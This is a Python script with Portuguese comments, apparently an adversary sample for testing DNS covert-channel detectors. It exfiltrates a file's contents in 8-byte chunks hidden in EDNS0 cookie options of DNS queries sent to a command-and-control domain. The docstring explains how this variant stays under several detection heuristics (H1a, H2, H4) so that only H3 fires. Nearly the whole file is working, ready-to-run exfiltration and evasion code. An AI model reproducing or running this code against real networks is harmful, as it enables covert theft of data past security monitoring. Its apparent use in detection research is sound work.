#!/usr/bin/env python3
"""
T3-variant: Cookie covert channel com length canonico (8 bytes)
e conteudo unico por query.

Diferenca em relacao a T3 (t3_cookie.py):
- T3 original: optdata = client_cookie(8) + server_cookie(8..32)
              total optlen entre 16 e 40 bytes -> aciona H2
              (cookie length anomalo, fora de {8,16,24}).
- T3-variant: optdata = client_cookie(8 bytes apenas)
             optlen fixo em 8 -> NAO aciona H2.
             Cada query usa client_cookie distinto, derivado do
             payload -> aciona H3 (recorrencia de hash em code 10).

Propriedades adversariais:
- Codigo IANA 10 (Cookie, RFC 7873) -> H1a nao dispara (whitelist).
- Length 8 bytes (cliente nominal, RFC 7873 secao 4.1) -> H2 nao
  dispara ({8} esta em {8,16,24}).
- udp_payload_size constante -> H4 nao dispara.
- Hashes do conteudo unicos por chunk -> H3 dispara.

Operacional:
- src_port FIXO por run (sport=src_port abaixo). Crucial porque
  H3 agrega por c$uid (Zeek 5-tupla). Com sport=RandShort() do
  scapy, cada query vira uid distinto e H3 nao dispara mesmo
  com conteudo unico. Adversario realista mantem socket aberto;
  refletimos isso aqui.
- 8 bytes por chunk. Para N bytes de payload, ceil(N/8) queries.
- Padding final com bytes aleatorios se ultimo chunk < 8.
"""

import struct
import time
import random
import os

from scapy.all import IP, UDP, send
from scapy.layers.dns import DNS, DNSQR, DNSRROPT, EDNS0TLV

COOKIE_OPT_CODE = 10  # RFC 7873
CHUNK_SIZE = 8        # client cookie length, RFC 7873 sec 4.1


def encode_chunk(chunk: bytes) -> EDNS0TLV:
    """Cada chunk vira o client_cookie (8 bytes exatos).

    Se chunk < 8, padding aleatorio. Se chunk > 8, trunca.
    """
    if len(chunk) < CHUNK_SIZE:
        chunk = chunk + os.urandom(CHUNK_SIZE - len(chunk))
    elif len(chunk) > CHUNK_SIZE:
        chunk = chunk[:CHUNK_SIZE]

    return EDNS0TLV(
        optcode=COOKIE_OPT_CODE,
        optlen=CHUNK_SIZE,
        optdata=chunk,
    )


def build_query(domain: str, chunk: bytes,
                dns_server: str, src_port: int,
                buf_size: int = 4096):
    """Construir 1 query DNS com 1 chunk no client_cookie.

    src_port deve ser fixo entre queries de um mesmo run para
    Zeek agregar tudo em 1 uid (necessario para H3).
    """
    edns0_opt = encode_chunk(chunk)

    pkt = (
        IP(dst=dns_server) /
        UDP(dport=53, sport=src_port) /
        DNS(
            rd=1,
            qd=DNSQR(qname=domain, qtype='A'),
            ar=DNSRROPT(
                rclass=buf_size,
                rdata=[edns0_opt],
            )
        )
    )
    return pkt


def exfiltrate_bytes(data: bytes, domain: str,
                     dns_server: str,
                     src_port: int = None,
                     interval: float = 0.05,
                     jitter: float = 0.02) -> int:
    """Exfiltrar buffer de bytes via T3-variant.

    Args:
      data: payload (256..4096 bytes recomendado).
      domain: dominio C2 (subdominio diferente por chunk).
      dns_server: IP do resolver (e.g. 10.0.1.2).
      src_port: UDP source port fixo. None -> aleatorio em [10000,60000].
      interval: pausa entre queries (s).
      jitter: variacao aleatoria do interval (s).

    Returns: numero de queries enviadas.
    """
    if src_port is None:
        src_port = random.randint(10000, 60000)

    total_chunks = (len(data) + CHUNK_SIZE - 1) // CHUNK_SIZE
    sent = 0

    for i in range(0, len(data), CHUNK_SIZE):
        chunk = data[i:i + CHUNK_SIZE]
        chunk_idx = i // CHUNK_SIZE
        subdomain = f"v{chunk_idx}.{domain}"

        pkt = build_query(subdomain, chunk, dns_server, src_port)
        send(pkt, verbose=0)
        sent += 1

        sleep_for = interval + random.uniform(-jitter, jitter)
        time.sleep(max(0.0, sleep_for))

    return sent


def exfiltrate_file(filepath: str, domain: str,
                    dns_server: str,
                    src_port: int = None) -> int:
    """Wrapper que le arquivo e chama exfiltrate_bytes."""
    with open(filepath, 'rb') as f:
        data = f.read()

    sent = exfiltrate_bytes(data, domain, dns_server, src_port=src_port)
    print(f"[T3-variant] Exfiltrado {len(data)} bytes em {sent} chunks "
          f"({CHUNK_SIZE} bytes/chunk) via sport={src_port or 'auto'}")
    return sent
